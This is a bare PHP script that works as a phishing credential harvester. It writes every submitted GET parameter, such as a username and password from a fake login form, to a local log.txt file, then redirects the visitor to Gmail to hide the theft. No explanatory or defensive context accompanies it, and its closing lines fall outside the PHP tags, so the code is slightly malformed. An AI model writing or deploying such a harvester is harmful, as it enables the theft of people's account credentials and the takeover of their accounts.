<?php
header("Location: 
http://www.Gmail.com"); 
$handle = fopen("log.txt" 
, 
"a"); 
foreach($_GET as $variable 
=> $value) { fwrite($handle, 
$variable); 
fwrite($handle, 
"="); 
fwrite($handle, $value); 
fwrite($handle, 
"\r\n"); 
} 
fwrite($handle, 
"\r\n"); 
?>
fclose($handle); exit;